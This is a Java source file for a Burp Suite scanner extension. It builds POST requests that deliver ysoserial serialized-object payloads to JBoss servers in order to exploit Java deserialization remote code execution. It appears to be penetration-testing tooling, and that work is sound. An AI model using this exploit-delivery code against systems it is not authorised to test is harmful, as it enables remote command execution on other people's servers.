/*
	JBossSerializedInsertionPoint.java
	
	v0.5 (11/22/2016)
	
	Custom insertion point for Java Deserialization Remote Code Execution, specifically against the JBoss platform. Accepts a serialized object containing
	an operating system command from ysoserial and generates a POST request containing the object.
*/

package burp;

import java.util.*;

public class JBossSerializedInsertionPoint implements IScannerInsertionPoint {
	private IHttpRequestResponse baseRequestResponse;
	private String baseValue; //not sure what to do with this yet
	private String insertionPointName;
	private IExtensionHelpers helpers;
	
	static final String CONTENT_TYPE = "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue";
	
	public JBossSerializedInsertionPoint(IExtensionHelpers h,IHttpRequestResponse baseRR) { //TODO: pass in IBurpExtenderCallbacks rather than IExtensionHelpers
		baseRequestResponse = baseRR;
		baseValue = ""; //not sure what to do with this yet
		insertionPointName = "SuperSerial-JBoss";
		helpers = h;
	}
	
	private byte[] buildExploitRequest(byte[] payload) {
		IRequestInfo baseReqInfo = helpers.analyzeRequest(baseRequestResponse);
		List<String> headers = baseReqInfo.getHeaders();
		String method = baseReqInfo.getMethod();
		
		//check if base request is a POST; if not, change to post
		if(!method.equalsIgnoreCase("POST")) {
			String firstLine = headers.get(0);
			headers.remove(0);
			firstLine = firstLine.replaceFirst(method,"POST");
			headers.add(0,firstLine);
		}
		
		//get headers from base request and look for Content-Type headers; if found, remove them all
		Iterator<String> headersItr = headers.iterator();
		ArrayList<String> contentTypeHeaders = new ArrayList<String>(1);
		while(headersItr.hasNext()) {
			String header = headersItr.next();
			if((header.length()>="Content-Type:".length())) {
				if(header.substring(0,"Content-Type:".length()).equalsIgnoreCase("Content-Type:")) { //Content-Type header found
					contentTypeHeaders.add(header);
				}
			}
		}
		if(!contentTypeHeaders.isEmpty()) {
			Iterator<String> cthItr = contentTypeHeaders.iterator();
			while(cthItr.hasNext()) {
				headers.remove(cthItr.next());
			}
		}
		
		//add correct content-type header and return
		headers.add("Content-Type: "+CONTENT_TYPE);
		return helpers.buildHttpMessage(headers,payload);
	}
	
	
	//IScannerInsertionPoint methods
	@Override
	public byte[] buildRequest(byte[] payload) {
		return buildExploitRequest(payload);
	}
	
	@Override
	public String getBaseValue() {
		return baseValue;
	}
	
	@Override
	public String getInsertionPointName() {
		return insertionPointName;
	}
	
	@Override
	public byte getInsertionPointType() {
		return IScannerInsertionPoint.INS_ENTIRE_BODY;
	}
	
	@Override
	public int[] getPayloadOffsets(byte[] payload) {
		byte[] exploitReq = buildExploitRequest(payload);
		IRequestInfo exploitReqInfo = helpers.analyzeRequest(exploitReq);
		int dataStart = exploitReqInfo.getBodyOffset();
		return new int[] {dataStart,exploitReq.length};
	}
}
